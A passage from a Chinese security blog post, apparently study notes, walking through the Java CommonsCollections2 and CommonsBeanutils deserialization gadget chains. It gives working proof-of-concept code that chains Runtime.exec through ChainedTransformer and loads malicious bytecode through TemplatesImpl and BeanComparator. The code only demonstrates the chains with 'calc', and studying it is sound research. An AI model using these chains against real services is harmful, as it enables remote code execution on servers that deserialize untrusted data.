<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC17.png" class>
<p>这个函数里面调用了sifdown()，单步进入这个函数</p>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC18.png" class>
<p>这里面开始比较队列中的元素了，进入siftDownUsingComparator()</p>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC19.png" class>
<p>其中调用了comparator.compare()实际上就是在调用TransformingComparator#comparator再单步进入</p>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC20.png" class>
<p>最终找到触发点。</p>
<p>总结一下调用关系</p>
<p>1.java.util.PriorityQueue
是⼀个优先队列（Queue），基于⼆叉堆实现，队列中每⼀个元素有自己的优先级，节点之间按照优先级大小排序成⼀棵树</p>
<p>2.反序列化时为什么需要调⽤ heapify()
⽅法？为了反序列化后，需要恢复（换⾔之，保证）这个 结构的顺序</p>
<p>3.排序是靠将⼤的元素下移实现的。 siftDown() 是将节点下移的函数， ⽽
comparator.compare() ⽤来⽐较两个元素⼤⼩ TransformingComparator 实现了
java.util.Comparator 接⼝，这个接⼝⽤于定义两个对象如何进⾏⽐较。
siftDownUsingComparator() 中就使⽤这个接⼝的 compare()
⽅法⽐较树的节点</p>
<p>按照这个思路编写poc</p>
<p>先按照之前的思路编写一个Transformer</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">faketranformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketranformer)</span><br></pre></td></tr></table></figure>
<p>然后我们创建一个TransformingComparator，传入我们的Transformer</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chainedTransformer);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>实例化PriorityQueue对象，第⼀个参数是初始化时的大小，至少需要2个元素才会触发排序和⽐较，
所以是2；第⼆个参数是⽐较时的Comparator，传⼊前⾯实例化的comparator。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, transformingComparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">setFieldValue(chainedTransformer, <span class="string">&quot;iTransformers&quot;</span>, transformer);</span><br></pre></td></tr></table></figure>
<p>运行之后</p>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC15.png" class>
<h5 id="cb">CB</h5>
<p>在上一个CC2的Commons-Collections链当中使用了一个全新的对象，名为PriorityQueue，这是一个优先队列，队列中的每一个元素都有一个优先级，这个对象在反序列化的时候，为了保证优先级的顺序，会进行排序操作，排序操作过程中就会涉及到java.util.Comparator接口当中的compare()方法。</p>
<p>这个compare()方法里面会调用transformer()那么，什么对象有会调用compare()，除了priorityqueue</p>
<h6 id="apache-commons-beanutils">Apache Commons Beanutils</h6>
<p>我们知道java当中的一些命名方法比如utils这个缩写一般适用于一个工具集，这个工具集是用于Bean的，那么什么是Bean，这其实是一个困扰了我很久的问题，从一开始的java学习过程中就不断有这个字眼，他们都说Bean就是指一个java类，而我却并不清楚这是一个什么样的类</p>
<h6 id="java-bean">Java Bean</h6>
<p>Java中有很多的class的定义都符合这样的标准：</p>
<p>1.若干private实例字段；</p>
<p>2.通过public方法来读写实例字段</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.age; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123; <span class="built_in">this</span>.age = age; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果所有的读写方法都满足如下的命名规范：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读方法:</span></span><br><span class="line"><span class="keyword">public</span> Type <span class="title function_">getXyz</span><span class="params">()</span></span><br><span class="line"><span class="comment">// 写方法:</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setXyz</span><span class="params">(Type value)</span></span><br></pre></td></tr></table></figure>
<p>那么这个类(class)就叫做(java
bean)。boolean类型的变量有关它的变量应该是isXXX()</p>
<p>javabean的主要作用是用于传递数据，也就是把一组数据组合成一个JavaBean以便于传输。</p>
<p>小结：</p>
<p>JavaBean是一种符合命名规范的<code>class</code>，它通过<code>getter</code>和<code>setter</code>来定义属性；</p>
<p>属性是一种通用的叫法，并非Java语法规定；</p>
<p>可以利用IDE快速生成<code>getter</code>和<code>setter</code>；</p>
<p>使用<code>Introspector.getBeanInfo()</code>可以获取属性列表</p>
<h6 id="commons-beanutils">commons-beanutils</h6>
<p>commons-beanutils中提供了一个静态方法PropertyUtils.getProperty，让使用者可以直接调用任意JavaBean的getter方法，比如</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">Person</span>(), <span class="string">&quot;name&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>上面的代码可以自动找到Person对象当中的name属性的getter方法，也就是getName，然后调用，获得返回值。除此之外，PropertyUtils.getProperty还可以递归的获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过</p>
<p><code>PropertyUtils.getProperty(a, "b.c");</code>这样的方式递归获取c属性的getter。</p>
<h6 id="getter的妙用">getter的妙用</h6>
<p>回到利用的正题当中，我们想找到一个使用了Comparator.compare()的对象，而在commons-beanutils包中就存在一个:<code>org.apache.commons.benautils.BeanComparator</code>,它实现了java.util.Comparator接口。他的compare方法实现如下：</p>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CB1.png" class>
<p>里面的大体逻辑是这样的：当this.property的值为null的时候，则会直接比较这两个对象；当this.property不为空的时候使用getProperty()方法获取对象中的this.property属性，然后把取出来的属性进行比较。</p>
<p>之前看到javabean的时候，getProperty()方法会调用一个javabean的getter方法，这个方法是执行代码的关键。</p>
<p>我们曾在TemplatesImpl当中找到过这样的一条链</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>
<p>在上一次的触发当中我们使用的是newTransformer()直接触发，而并没有使用第一个函数，而getOutputProperties()这个函数刚好符合getter方法的定义，也是get开头同样的驼峰写法。</p>
<p>我们再回来看BeanComparator#compare()方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object value1 = PropertyUtils.getProperty(o1, this.property);</span><br></pre></td></tr></table></figure>
<p>所以我们只需要填入o1为TemplatesImpl，this.property为OutputProperties那么他就可以调用getOutputProperties()从而触发整条链。</p>
<h6 id="反序列化链的构造">反序列化链的构造</h6>
<p>按照之前的分析我们只需要把原先的Comparator换成BeanComparator就行了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldname, Object fieldvalue)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,fieldvalue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> classPool.get(Evil.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(beanComparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在初始化BeanComparator的时候，默认的property是空，所以我们需要在后面进行更改。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>而且queue之前填入的是数字，所以后期需要改成恶意类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates, templates&#125;);</span><br></pre></td></tr></table></figure>
<p>最终弹出计算器</p>
<img data-src="/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CB3.png" class>
<h5 id="section"></h5>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>f4nx1ng
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://f4nx1ng.github.io/2024/07/29/%E4%BB%8EJAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="从JAVA安全漫谈看反序列化">https://f4nx1ng.github.io/2024/07/29/从JAVA安全漫谈看反序列化/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/JAVA%E5%AE%89%E5%85%A8/" rel="tag"># JAVA安全</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" rel="prev" title="Tomcat内存马合集">
                  <i class="fa fa-angle-left"></i> Tomcat内存马合集
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/07/29/JDD%E8%AE%BA%E6%96%87%E8%A7%A3%E8%AF%BB/" rel="next" title="JDD论文解读">
                  JDD论文解读 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">f4nx1ng</span>
  </div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>


  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"neutral","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.9.0/mermaid.min.js","integrity":"sha256-stuqcu2FrjYCXDOytWFA5SoUE/r3nkp6gTglzNSlavU="}}</script>
  <script src="/js/third-party/tags/mermaid.js"></script>


  <script src="/js/third-party/fancybox.js"></script>



  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
